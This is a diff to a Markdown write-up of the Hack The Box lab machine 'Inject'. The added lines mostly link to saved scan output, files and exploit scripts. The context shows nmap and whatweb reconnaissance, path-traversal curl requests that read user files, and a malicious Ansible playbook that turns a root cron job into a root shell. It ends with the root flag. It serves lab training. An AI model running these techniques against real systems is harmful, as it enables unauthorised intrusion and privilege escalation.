@@ -1,14 +1,21 @@
 # Inject
 
-First, run a standard scan with nmap to discover open ports !
+First, run a standard scan of the machine with nmap to discover open ports and store the output in a file named [```allPorts```](./nmap/allPorts) !
 ```
 sudo nmap -sS --min-rate 5000 --open -Pn -n -vvv -p- 10.10.11.204 -oG allPorts
 ```
 
-To get the details and version
+To get the details and version aand store the output in a file named [```targeted```](./nmap/targetedPorts)
 ```
 nmap -sC -sV -p22,8080 10.10.11.204 -oN targeted
 ```
+> It's allways important to save those information about the machine !
+
+You can eventully use other tools like ```whatweb``` to scan the web
+```
+whatweb http://10.10.11.204:8080
+```
+
 
 After inspecting the web page at `http://10.10.11.204:8080`, you'll notice there's an `upload` section in the right corner! Let's intercept the request with Burp Suite!
 ```
@@ -118,7 +125,7 @@ Let's take a look at it !
 curl -s -X GET "http://10.10.11.204:8080/show_image?img=../../../../../../home/frank/.m2"
 ```
 
-We have a ```settings.xml``` file ! let's check its content !
+We have a [```settings.xml```](./content/settings.xml) file ! let's check its content !
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 <settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema
@@ -155,7 +162,7 @@ Let's check if other directories have interesting files. For example, in  ```/va
 curl -s -X GET "http://10.10.11.204:8080/show_image?img=../../.."
 ```
 
-In the output there's a ```pom.xml``` file !
+In the output there's a [```pom.xml```](./content/pom.xml) file !
 ```
 .classpath
 .DS_Store
@@ -246,7 +253,7 @@ It worked! We're now `Phil`!
 phil@inject:/
 ```
 
-Let's check the user flag !
+Let's check the [`user`](./user.txt) flag !
 ```
 cat /home/phil/user.txt
 ```
@@ -293,6 +300,7 @@ In our `home` directory, we have the `pspy64` binary, which is for comparing pro
 2023/07/09 14:42:10 CMD: UID=0     PID=70599  | /usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml
 2023/07/09 14:42:11 CMD: UID=0     PID=70600  | /bin/sh -c rm -f -r /root/.ansible/tmp/ansible-tmp-1688913728.344112-70575-115364851993038/ > /dev/null 2>&1 && sleep 0
 ```
+> We could create our own script for the same purpose like [`procmon.sh`](./exploits/procmon.sh)
 
 The output reveals that there's a cron job running for the root user. Indeed, the root deletes all files in `/opt/automation/tasks/*`, then it copies a script named `playbook_1.yml` from its home directory to the `/opt/automation/tasks/*` directory, and finally, it executes all the scripts in the directory!
 
@@ -308,7 +316,7 @@ Before proceeding, let's look up `ansible` on the internet and check the [`playb
       state: started
 ```
 
-According to the Ansible documentation, we can run commands! So, let's create an ```exploit.yml``` !
+According to the Ansible documentation, we can run commands! So, let's create an [```exploit.yml```](./exploits/exploit.yml) !
 ```
  hosts: localhost
  tasks:
@@ -336,7 +344,7 @@ bash-5.0# whoami
 root
 ```
 
-Finally, after gaining root access, we can check the (`root`)[./root.txt] flag !
+Finally, after gaining root access, we can check the [`root`](./root.txt) flag !
 ```
 bash-5.0# cat /root/root.txt
 f8c8c8b90b95e35c53171e4c3acc0323
